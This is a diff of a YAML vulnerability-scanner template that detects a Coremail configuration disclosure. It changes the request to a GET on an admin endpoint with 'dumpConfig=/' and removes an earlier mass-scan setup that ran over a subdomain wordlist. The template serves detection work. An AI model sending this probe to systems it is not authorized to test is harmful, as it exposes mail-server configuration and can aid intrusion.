@@ -1,23 +1,21 @@
 id: coremail-config-disclosure
 
 info:
-  name: Coremail Config Disclosure
+  name: Coremail - Config Discovery
   author: princechaddha
   severity: high
-  reference: https://www.secpulse.com/archives/107611.html
-  tags: config,exposure
+  description: Coremail configuration information was discovered.
+  reference:
+    - https://www.secpulse.com/archives/107611.html
+  metadata:
+    max-request: 1
+  tags: config,exposure,coremail,vuln
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/'
 
-    raw:
-      - |
-        GET /mailsms/s?func=ADMIN:appState&dumpConfig=/ HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
     matchers-condition: and
     matchers:
       - type: word
@@ -31,3 +29,4 @@ requests:
       - type: status
         status:
           - 200
+# digest: 4a0a004730450220655fcf14ffe010e80942abdff6d514d4afa41e64d0d661e567363c794b6e30aa022100e7825074b737a2f966b43dc9d659fbd098cbfe819cd83af85dfa9ac49cbfca9c:922c64590222798bb761d5b6d8e72950
